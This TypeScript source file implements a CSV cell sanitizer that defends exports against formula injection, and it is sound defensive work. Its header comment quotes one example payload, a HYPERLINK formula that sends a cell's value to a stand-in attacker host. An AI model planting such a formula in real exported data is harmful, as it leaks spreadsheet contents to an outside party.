/**
 * B2-061 / security-audit LOW-01: shared CSV cell sanitizer. Every CSV export in the product used
 * to build rows with ad-hoc `"${value}"` interpolation — most escaped an internal `"`, some
 * didn't, and *none* defended against CSV/formula injection (CWE-1236): a value starting with
 * `=`, `+`, `-` or `@` is evaluated as a formula the moment the file is opened in Excel/Sheets,
 * which is what "Export CSV" is for. Quoting alone does not stop this — only prefixing the
 * leading character does. Confirmed exploitable live via a dish/customer name containing
 * `=HYPERLINK("http://evil.test?x="&A1,"Click")`.
 *
 * This file was fixed independently on two branches at the same time (this one as B2-061, the
 * other as the security-audit pass's LOW-01) with different function names for the same fix —
 * both kept here rather than picking one, since existing call sites on either side already use
 * their own name; a follow-up cleanup can consolidate onto one if desired.
 *
 * Every export should build its rows by mapping each field through `sanitizeCsvCell`/
 * `escapeCsvField` (or `toCsvRow`/`toCsv` for a whole row/table) instead of hand-rolling quoting.
 */

/** Leading characters Excel/Sheets/LibreOffice treat as the start of a formula. */
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Sanitizes one field for a CSV cell: escapes internal double quotes, neutralises a leading
 * formula-trigger character by prefixing a `'` (a spreadsheet renders the value as literal text
 * instead of evaluating it — the standard mitigation for this class), and quotes the field
 * whenever it contains a comma, quote, newline or was formula-prefixed.
 */
export function sanitizeCsvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';
  let str = String(value);

  if (str.length > 0 && FORMULA_TRIGGER_CHARS.has(str[0])) {
    str = `'${str}`;
  }

  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Builds one CSV line from a row of raw field values, sanitizing every field. */
export function toCsvRow(fields: Array<string | number | boolean | null | undefined>): string {
  return fields.map(sanitizeCsvCell).join(',');
}

/** Builds a full CSV document (header + rows) from raw values, sanitizing every field. */
export function toCsv(header: Array<string | number>, rows: Array<Array<string | number | boolean | null | undefined>>): string {
  return [toCsvRow(header), ...rows.map(toCsvRow)].join('\r\n');
}

/**
 * Render a single CSV cell, quoted and escaped, with a leading apostrophe
 * guard against formula injection for values Excel would otherwise treat
 * as a formula. Always quotes (unlike `sanitizeCsvCell`, which only quotes
 * when the field needs it) — equally safe, just more conservative output.
 */
export function escapeCsvField(value: string | number | null | undefined): string {
  const str = value === null || value === undefined ? '' : String(value);
  const guarded = [...FORMULA_TRIGGER_CHARS].some((c) => str.startsWith(c)) ? `'${str}` : str;
  return `"${guarded.replace(/"/g, '""')}"`;
}
